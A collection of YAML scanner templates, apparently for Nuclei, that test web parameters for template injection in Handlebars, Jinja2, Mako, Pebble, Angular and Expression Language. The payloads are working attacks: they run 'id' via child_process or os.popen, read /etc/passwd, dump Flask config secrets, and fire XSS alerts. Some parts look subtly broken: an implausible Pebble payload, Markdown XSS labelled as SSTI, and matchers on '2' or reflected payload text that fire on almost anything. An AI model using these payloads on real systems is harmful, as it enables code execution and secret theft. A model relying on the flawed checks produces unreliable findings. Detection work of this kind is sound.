id: ssti-handlebars
info:
  name: SSTI Handlebars/Node.js
  author: AniipID
  severity: critical
  description: Detects Handlebars template injection in Node.js apps
  tags: ssti,handlebars,nodejs
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
      - "{{BaseURL}}?name={{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require('child_process').execSync('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
    matchers:
      - type: word
        words:
          - "uid="
          - "child_process"
        condition: or
        name: "handlebars-ssti"
---
id: ssti-markdown
info:
  name: SSTI via Markdown
  author: AniipID
  severity: high
  description: Detects SSTI through markdown parser rendering
  tags: ssti,markdown,rendering
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name=[test](javascript:alert(1))"
      - "{{BaseURL}}?name=<img src=x onerror=alert(1)>"
    matchers:
      - type: word
        words:
          - "onerror"
          - "javascript:alert"
        condition: or
        name: "markdown-ssti"
---
id: ssti-jinja2-rce
info:
  name: SSTI Jinja2 RCE
  author: AniipID
  severity: critical
  description: Detects Jinja2 SSTI leading to remote code execution
  tags: ssti,jinja2,rce,python
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{''.__class__.__mro__[1].__subclasses__()}}"
      - "{{BaseURL}}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
      - "{{BaseURL}}?name={{url_for.__globals__['current_app'].config}}"
      - "{{BaseURL}}?name={{g.__class__.__init__.__globals__['os'].popen('id').read()}}"
    matchers:
      - type: regex
        regex:
          - "SECRET_KEY"
          - "SQLALCHEMY_DATABASE_URI"
          - "uid="
          - "popen"
        condition: or
        name: "jinja2-rce"
---
id: ssti-expression-language
info:
  name: SSTI Expression Language
  author: AniipID
  severity: high
  description: Detects EL injection across multiple languages
  tags: ssti,el,expression
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name=${1+1}"
      - "{{BaseURL}}?name=${\"test\"}"
      - "{{BaseURL}}?name=%24%7B1%2B1%7D"
      - "{{BaseURL}}?name=%24%7B7*7%7D"
    matchers:
      - type: word
        words:
          - "2"
          - "test"
          - "49"
        condition: or
        name: "el-evaluated"
---
id: ssti-pebble
info:
  name: SSTI Pebble Template
  author: AniipID
  severity: critical
  description: Detects Pebble template injection in Java apps
  tags: ssti,pebble,java
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{7*7}}"
      - "{{BaseURL}}?name={{rocket.Q_CONF.rocket.connection.jdbc}}"
    matchers:
      - type: word
        words:
          - "49"
          - "jdbc"
        condition: or
        name: "pebble-ssti"
---
id: ssti-angular
info:
  name: SSTI Angular Template
  author: AniipID
  severity: high
  description: Detects Angular template injection (Client-Side)
  tags: ssti,angular,client-side
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name={{1+1}}"
      - "{{BaseURL}}?name={{constructor.constructor('alert(1)')()}}"
    matchers:
      - type: word
        words:
          - "constructor"
          - "alert"
        condition: or
        name: "angular-ssti"
---
id: ssti-mako
info:
  name: SSTI Mako Template
  author: AniipID
  severity: critical
  description: Detects Mako template injection in Python apps
  tags: ssti,mako,python
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name=${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}"
      - "{{BaseURL}}?name=${self.module.cache.util.os.popen('id').read()}"
    matchers:
      - type: word
        words:
          - "popen"
          - "uid="
        condition: or
        name: "mako-ssti"
